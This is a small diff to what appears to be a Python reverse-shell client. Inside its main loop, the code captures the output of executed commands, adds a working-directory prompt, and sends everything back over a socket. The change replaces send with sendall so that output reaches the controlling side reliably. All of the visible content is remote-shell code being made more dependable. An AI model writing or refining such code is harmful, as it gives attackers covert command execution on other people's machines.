@@ -18,6 +18,6 @@ while True:
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte,"utf-8")
         currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
+        s.sendall(str.encode(output_str + currentWD))
 
         print(output_str)
